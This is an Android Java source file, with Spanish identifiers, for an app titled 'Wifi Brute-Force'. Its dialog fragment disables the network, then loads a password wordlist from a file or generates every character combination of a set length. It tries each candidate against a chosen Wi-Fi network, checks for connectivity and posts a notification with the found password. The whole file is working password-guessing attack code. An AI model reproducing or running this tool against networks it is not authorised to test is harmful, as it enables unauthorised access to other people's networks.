package wifi_bruteforce.mathgadget.com.wifi_bruteforce;

import android.annotation.SuppressLint;
import android.app.AlertDialog;
import android.app.Dialog;
import android.app.DialogFragment;
import android.app.NotificationManager;
import android.content.Context;
import android.os.AsyncTask;
import android.os.Bundle;
import android.support.v4.app.NotificationCompat;
import android.view.LayoutInflater;
import android.view.View;
import android.widget.TextView;

import java.io.BufferedReader;
import java.io.FileReader;
import java.io.IOException;
import java.util.ArrayList;

/**
 * Created by Gamer on 03/01/2018.
 */

@SuppressLint("ValidFragment")
public class Passwords extends DialogFragment {

    private View view;
    private TextView Tv_Pass;
    private WifiController Wifi;
    private String Elem;
    private boolean Leer_Archivo;
    private NotificationCompat.Builder Notificacion;
    private NotificationManager NotiM;
    private int Tamaño;
    private Tarea Tarea = new Tarea();
    private ArrayList<String> Contraseñas = new ArrayList<>();

    @SuppressLint("ValidFragment")
    public Passwords(String Elem, boolean Leer_Archivo, int Tamaño, WifiController Wifi) {
        this.Wifi = Wifi;
        this.Elem = Elem;
        this.Leer_Archivo = Leer_Archivo;
        this.Tamaño = Tamaño;
    }

    @Override
    public Dialog onCreateDialog(Bundle savedInstanceState) {
        setCancelable(false);
        AlertDialog.Builder builder = new AlertDialog.Builder(getActivity());
        LayoutInflater inflater = getActivity().getLayoutInflater();
        view = inflater.inflate(R.layout.passwords, null);
        Notificacion = new NotificationCompat.Builder(getActivity());
        NotiM = (NotificationManager) getActivity().getSystemService(Context.NOTIFICATION_SERVICE);
        Tv_Pass = view.findViewById(R.id.Tv_Pass);
        view.findViewById(R.id.Btn_Cancel).setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Tarea.cancel(true);
                Wifi.EnableNetwork();
            }
        });
        builder.setView(view)
                .setTitle("Wifi Brute-Force: Probando Contraseñas")
                .setIcon(R.drawable.wifi);
        Tarea.execute();
        return builder.create();
    }

    private class Tarea extends AsyncTask<Void, String, Void> {

        @Override
        protected Void doInBackground(Void... voids) {
            Wifi.DisableNetwork();
            if (Leer_Archivo) {
                try {Cargar_Archivo(Elem.toString());} catch (IOException e) {}
                if(Contraseñas.isEmpty()){
                    publishProgress("Error No Hay Contenido En El Archivo");
                    try {Thread.sleep(2500);} catch (InterruptedException e) {}
                    dismiss();
                    return null;
                }else{
                    Contraseña_Archivo();
                }
            } else {
                WordList(Elem.toCharArray(), "", Tamaño);
            }
            return null;
        }

        @Override
        protected void onProgressUpdate(String... values) {
            super.onProgressUpdate(values);
            Tv_Pass.setText("\nProbando: " + values[0].toString());
        }

        @Override
        protected void onPostExecute(Void aVoid) {
            super.onPostExecute(aVoid);
            dismiss();
        }

        @Override
        protected void onCancelled() {
            super.onCancelled();
            try {
                this.cancel(true);
                dismiss();
            } catch (Throwable throwable) {
            }
        }

        private void WordList(char[] elem, final String act, int Tamaño) {
            if(isCancelled()) return;
            if (Tamaño == 0) {
                Connect(act);
            } else {
                for (int i = 0; i < elem.length; i++) {
                    if(isCancelled()) break;
                    WordList(elem, act + elem[i], Tamaño - 1);
                }
            }
        }
        private void Connect(String Contra){
            publishProgress(Contra);
            Notificacion(Contra, 001, "Probando", "Probando Contraseñas", R.drawable.notificacion, null);
            Wifi.Connect(Contra, Wifi.WifiInfo.get(Wifi.Position).getsNombre());
            Wifi.Reconnect();
            try {Thread.sleep(15000);} catch (InterruptedException e) {}
            if (Wifi.isOnline()) {
                Wifi.Remove();
                try {
                    Wifi.EnableNetwork();
                    Notificacion(Contra, 002, "Encontrado!", "Contraseña Encontrada", R.drawable.open, new long[] {100, 250, 100, 500});
                    onCancelled();
                } catch (Throwable throwable) {
                    throwable.printStackTrace();
                }
            }
        }

        private void Notificacion(String Contraseña, int Id, String Title, String Ticker, int Icon, long[] Vibrate) {
            Notificacion.setAutoCancel(true)
                    .setSmallIcon(Icon)
                    .setTicker(Ticker)
                    .setContentText("Contraseña: " + Contraseña)
                    .setVibrate(Vibrate)
                    .setContentTitle(Title);
            NotiM.notify(Id, Notificacion.build());
        }
        private void Cargar_Archivo(String Ruta) throws IOException {
            publishProgress("Cargando Archivo...");
            try {Thread.sleep(1500);} catch (InterruptedException e) {}
            String cadena;
            FileReader f = new FileReader(Ruta);
            BufferedReader b = new BufferedReader(f);
            while((cadena = b.readLine())!=null) {
                Contraseñas.add(cadena);
            }
        }
        private void Contraseña_Archivo(){
            for (String Contraseña : Contraseñas){
                if(isCancelled()) return;
                Connect(Contraseña);
            }
        }
    }

}
